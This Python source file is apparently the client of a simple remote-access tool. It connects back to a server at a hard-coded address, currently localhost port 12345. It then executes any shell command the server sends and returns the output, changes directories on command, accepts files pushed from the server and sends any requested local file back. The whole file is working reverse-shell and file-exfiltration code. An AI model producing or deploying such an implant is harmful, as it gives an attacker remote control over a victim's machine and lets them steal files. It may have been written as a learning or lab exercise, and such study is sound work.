import socket
import time
import subprocess
import os
import struct, base64

# Function for colored output
def color(r=None, g=None, b=None, text=None, col=None):
    colors = {
        "red": (255, 0, 0),
        "green": (0, 255, 0),
        "blue": (0, 0, 255),
        "yellow": (255, 255, 0),
        "cyan": (0, 255, 255),
        "magenta": (255, 0, 255),
        "white": (255, 255, 255),
        "black": (0, 0, 0)
    }

    if col and col in colors:
        r, g, b = colors[col]

    if r is not None and g is not None and b is not None and text is not None:
        return "\033[38;2;{};{};{}m{} \033[38;2;255;255;255m".format(r, g, b, text)
    return text  # Default return of plain text if inputs are missing

def createSocket():
    #Create and return a socket.
    return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connectToServer(clientSocket):
    #Attempt to connect to the server, retrying if it fails.
    connected = False
    while not connected:
        try:
            clientSocket.connect(('127.0.0.1', 12345))
            connected = True
        except ConnectionRefusedError as e:
            conRefErrorStr = "\n-- Could NOT find server, trying again. Ctrl+C to terminate program fully"
            print(f"{color(col='red', text=str(e))} {conRefErrorStr}")
            for waiting in range(5): time.sleep(1)
        except KeyboardInterrupt: return 
        
def getServerInfo(clientSocket):
    #Return the server's IP and port.
    serverIP, serverPort = clientSocket.getpeername()
    return serverIP, serverPort

def handleCDCommand(data, clientSocket):
    try:
        # Change the directory
        path = data[3:].strip()  # Extract the path after 'cd '
        os.chdir(path)  # Change the current working directory
        current_dir = os.getcwd()  # Get the current working directory
        clientSocket.send(f"Changed directory to: {current_dir}".encode('utf-8'))
    except Exception as e:
        error_message = f"Error: {str(e)}"
        clientSocket.send(error_message.encode('utf-8'))

def handleUpload(clientSocket):
    try:
        # Receive the file size
        raw_size = clientSocket.recv(8)
        if not raw_size:
            print("Error: Did not receive file size.")
            return
        file_size = struct.unpack(">Q", raw_size)[0]

        # Receive the file name length and name
        file_name_length = struct.unpack(">I", clientSocket.recv(4))[0]
        file_name = clientSocket.recv(file_name_length).decode('utf-8')

        # Receive the file data
        with open(file_name, 'wb') as f:
            print(f"Receiving file from server: {file_name} ({file_size} bytes)")
            bytes_received = 0
            while bytes_received < file_size:
                data = clientSocket.recv(1024)
                if not data:
                    break
                f.write(data)
                bytes_received += len(data)
        print(f"File uploaded successfully: {file_name}")
    except Exception as e:
        print(f"Error during upload: {str(e)}")

def handleDownload(clientSocket, path):
    try:
        # Check if the file exists
        if not os.path.exists(path):
            clientSocket.send(b"ERROR: File not found.")
            return

        # Step 1: Send the file size
        file_size = os.path.getsize(path)
        clientSocket.send(struct.pack(">Q", file_size))

        # Step 2: Send the file name length and file name
        file_name = os.path.basename(path).encode('utf-8')
        clientSocket.send(struct.pack(">I", len(file_name)) + file_name)

        # Step 3: Send the file content in chunks
        with open(path, 'rb') as f:
            # print(f"Sending {file_name.decode('utf-8')} to server...")
            while True:
                data = f.read(1024)
                if not data:
                    break
                clientSocket.sendall(data)
            # print(f"File sent successfully: {file_name.decode('utf-8')}")
    except Exception as e:
        error_message = f"Error during file transfer: {str(e)}"
        clientSocket.send(error_message.encode('utf-8'))

def processData(data, clientSocket):
    if data.lower() == "disconnect":
        print(f"{color(col='yellow', text='Disconnecting...')}")
        clientSocket.close()
        return True  # Indicate that the socket was closed

    if data.lower().startswith("upload "): 
        # Server is requesting to upload a file to the client
        path = data[7:].strip()  # Extract the file path
        handleUpload(clientSocket)  # Call the upload handling function
        return False
    
    if data.lower().startswith("download "):
        # Extract the file path from the download command
        path = data[9:].strip()
        handleDownload(clientSocket, path)  # Call the download handling function
        return False  # Continue the loop

    # Check if the data is a 'cd' command
    if data.lower().startswith("cd "):
        handleCDCommand(data, clientSocket)
        return False  # Continue the loop
    
    try:
        # Run the command and capture output
        result = subprocess.run(data.split(), capture_output=True, text=True, timeout=30)  # Timeout of 5 seconds

        # Check for errors
        if result.returncode != 0:
            output = f"Error executing command: {result.stderr}"
        else:
            output = result.stdout

        # Send back the command output or error to the server
        clientSocket.send(output.encode('utf-8'))

    except subprocess.TimeoutExpired:
        # Handle command timeout
        output = "Error: Command timed out."
        clientSocket.send(output.encode('utf-8'))
    except Exception as e:
        clientSocket.send(f"Error: Possible wrong or mispelled command?".encode('utf-8'))

    return False  # Indicate that the socket is still open

def main():
    clientSocket = createSocket()
    # Try to connect to the server 
    try:
        connectToServer(clientSocket)
    except KeyboardInterrupt:
        print(color(col='yellow', text='Terminating process.'))
        return

    # Try to get the actual server IP address
    serverIP, serverPort = getServerInfo(clientSocket)
    print(f"{color(col='green', text='Connection established to:')} {serverIP}:{serverPort}")

    try:
        while True:
            try:
                data = clientSocket.recv(1024).decode('utf-8')
                if not data:
                    print(f"Connection closed by server.")
                    break
                if processData(data, clientSocket):
                    break  # Exit the loop if disconnected
            except OSError: return

    except KeyboardInterrupt:
        print(color(col='yellow', text='Terminating Connection.'))
    finally:
        # Ensure the socket is closed if it's still open
        if clientSocket:
            clientSocket.close()
        print("Client socket closed.")

if __name__ == "__main__":
    main()
